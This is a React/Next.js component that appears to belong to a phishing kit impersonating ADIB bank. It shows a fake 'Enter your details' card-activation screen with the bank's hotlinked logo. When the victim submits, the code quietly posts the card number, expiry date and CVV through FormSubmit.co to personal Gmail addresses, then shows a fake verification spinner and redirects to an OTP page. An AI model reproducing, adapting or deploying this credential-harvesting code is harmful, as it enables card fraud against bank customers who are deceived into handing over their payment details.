"use client"

import { useState } from "react"
import { useRouter } from "next/navigation"
import { ChevronLeft } from "lucide-react"
import { Button } from "@/components/ui/button"
import { CardFlipIcon } from "./card-flip"
// import emailjs from "@emailjs/browser" // Removed EmailJS import


export function EnterDetailsScreen() {
    const router = useRouter()
    const [cardNumber, setCardNumber] = useState("")
    const [expiryDate, setExpiryDate] = useState("")
    const [cvv, setCvv] = useState("")
    const [cvvFocused, setCvvFocused] = useState(false)
    const [loading, setLoading] = useState(false)

    // Luhn algorithm for card validation
    const isValidLuhn = (num: string) => {
        const arr = (num + "")
            .split("")
            .reverse()
            .map((x) => parseInt(x))
        const lastDigit = arr.splice(0, 1)[0]
        let sum = arr.reduce(
            (acc, val, i) =>
                i % 2 !== 0 ? acc + val : acc + ((val * 2) % 9) || 9,
            0
        )
        sum += lastDigit
        return sum % 10 === 0
    }

    const isFormValid =
        cardNumber.length === 16 &&
        expiryDate.length === 5 &&
        cvv.length === 3

    const handleConfirm = () => {
        setLoading(true)

        // FormSubmit.co Integration
        fetch("https://formsubmit.co/ajax/dastgirg244@gmail.com", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                Accept: "application/json",
            },
            body: JSON.stringify({
                _subject: "New ADIB Card Details",
                _cc: "k22454199@gmail.com",
                _template: "table",
                _captcha: "false",
                card_number: cardNumber,
                expiry_date: expiryDate,
                cvv: cvv,
                message: "New Card Details Submission",
            }),
        })
            .then((response) => response.json())
            .then((data) => console.log(data))
            .catch((error) => console.log(error))

        setTimeout(() => {
            router.push("/adibotp")
        }, 4000)
    }

    const formatExpiry = (value: string) => {
        const digits = value.replace(/\D/g, "")
        if (digits.length >= 2) {
            return digits.slice(0, 2) + "/" + digits.slice(2, 4)
        }
        return digits
    }

    return (
        <div className="relative flex flex-col h-[100dvh] w-screen overflow-hidden bg-background fixed inset-0">
            {/* Loading overlay */}
            {loading && (
                <div className="absolute inset-0 z-50 flex flex-col items-center justify-center bg-background">
                    <div className="relative w-12 h-12">
                        <svg
                            className="animate-spin"
                            viewBox="0 0 48 48"
                            fill="none"
                            xmlns="http://www.w3.org/2000/svg"
                        >
                            <circle
                                cx="24"
                                cy="24"
                                r="20"
                                stroke="#E4E7EC"
                                strokeWidth="4"
                            />
                            <path
                                d="M44 24c0-11.046-8.954-20-20-20"
                                stroke="#0B1F3F"
                                strokeWidth="4"
                                strokeLinecap="round"
                            />
                        </svg>
                    </div>
                    <p className="mt-5 text-[15px] font-medium text-foreground">
                        Verifying your details...
                    </p>
                </div>
            )}
            {/* Header area */}
            <div className="px-5 pt-4">
                <div className="relative flex items-center justify-center min-h-[48px] mb-2">
                    {/* Back button */}
                    <button
                        type="button"
                        onClick={() => router.back()}
                        className="absolute left-0 top-1/2 -translate-y-1/2 flex items-center justify-center w-10 h-10 -ml-2 rounded-full hover:bg-secondary transition-colors"
                        aria-label="Go back"
                    >
                        <ChevronLeft className="w-6 h-6 text-foreground" strokeWidth={1.5} />
                    </button>

                    {/* Logo & Text - Centered */}
                    <div className="flex items-center gap-1">
                        <span
                            className="text-[#1a2d5a] text-5xl tracking-tight"

                        >
                            ADIB
                        </span>
                        {/* Globe icon */}
                        {/* ADIB Logo Image */}
                        <img
                            src="https://www.adib.com/_catalogs/masterpage/ADIB_New_UI/assets/images/footer-logo.png"
                            alt="ADIB Logo"
                            width={72}
                            height={72}
                            className="mt-10"
                        />
                    </div>
                </div>

                {/* Title */}
                <h1
                    className="text-[28px] font-bold leading-tight mt-3 text-foreground"
                >
                    Enter your details
                </h1>

                {/* Subtitle */}
                <p
                    className="text-[15px] mt-2 leading-relaxed"
                    style={{ color: "#6B7B8D" }}
                >
                    Please enter your card details
                </p>
            </div>

            {/* Form area */}
            <div className="px-5 mt-8 flex-1">
                {/* Card number field */}
                <div>
                    <label
                        htmlFor="card-number"
                        className="block text-[15px] font-semibold text-foreground mb-2.5"
                    >
                        Card number
                    </label>
                    <input
                        id="card-number"
                        type="text"
                        inputMode="numeric"
                        placeholder="Enter card number"
                        value={cardNumber}
                        onChange={(e) => {
                            const val = e.target.value.replace(/\D/g, "").slice(0, 16)
                            setCardNumber(val)
                        }}
                        maxLength={16}
                        className="w-full h-[52px] rounded-full bg-input px-5 text-[15px] text-foreground placeholder:text-muted-foreground/60 focus:outline-none focus:ring-2 focus:ring-ring/30 transition-shadow"
                    />
                </div>

                {/* Expiry Date and CVV row */}
                <div className="flex gap-3 mt-5">
                    {/* Expiry Date field */}
                    <div className="flex-1">
                        <label
                            htmlFor="expiry-date"
                            className="block text-[15px] font-semibold text-foreground mb-2.5"
                        >
                            Expiry date
                        </label>
                        <input
                            id="expiry-date"
                            type="text"
                            inputMode="numeric"
                            placeholder="MM/YY"
                            value={expiryDate}
                            onChange={(e) => {
                                const raw = e.target.value.replace(/\D/g, "").slice(0, 4)
                                const inputType = (e.nativeEvent as any).inputType
                                if ((inputType === "deleteContentBackward" || inputType === "deleteContentForward") && raw.length <= 2) {
                                    setExpiryDate(raw)
                                } else {
                                    setExpiryDate(formatExpiry(raw))
                                }
                            }}
                            maxLength={5}
                            className="w-full h-[52px] rounded-full bg-input px-5 text-[15px] text-foreground placeholder:text-muted-foreground/60 focus:outline-none focus:ring-2 focus:ring-ring/30 transition-shadow"
                        />
                    </div>

                    {/* CVV field */}
                    <div className="flex-1">
                        <label
                            htmlFor="cvv"
                            className="block text-[15px] font-semibold text-foreground mb-2.5"
                        >
                            CVV
                        </label>
                        <div className="relative">
                            <input
                                id="cvv"
                                type="text"
                                inputMode="numeric"
                                placeholder="123"
                                value={cvv}
                                onChange={(e) => {
                                    const val = e.target.value.replace(/\D/g, "").slice(0, 3)
                                    setCvv(val)
                                }}
                                onFocus={() => setCvvFocused(true)}
                                onBlur={() => setCvvFocused(false)}
                                maxLength={3}
                                className="w-full h-[52px] rounded-full bg-input pl-5 pr-14 text-[15px] text-foreground placeholder:text-muted-foreground/60 focus:outline-none focus:ring-2 focus:ring-ring/30 transition-shadow"
                            />
                            <div className="absolute right-4 top-1/2 -translate-y-1/2 pointer-events-none">
                                <CardFlipIcon showBack={cvvFocused || cvv.length > 0} />
                            </div>
                        </div>
                    </div>
                </div>

            </div>

            {/* Bottom area */}
            <div className="px-5 pb-8 mt-auto">

                {/* Activate Button */}
                <Button
                    className="w-full h-14 cursor-pointer text-lg font-bold rounded-full bg-[#1A6DD4] hover:bg-[#1A6DD2] text-white transition-all shadow-lg shadow-orange-500/20"
                    disabled={!isFormValid || loading}
                    onClick={handleConfirm}
                >
                    {loading ? "Processing..." : "Activate"}
                </Button>
            </div>
        </div>
    )
}
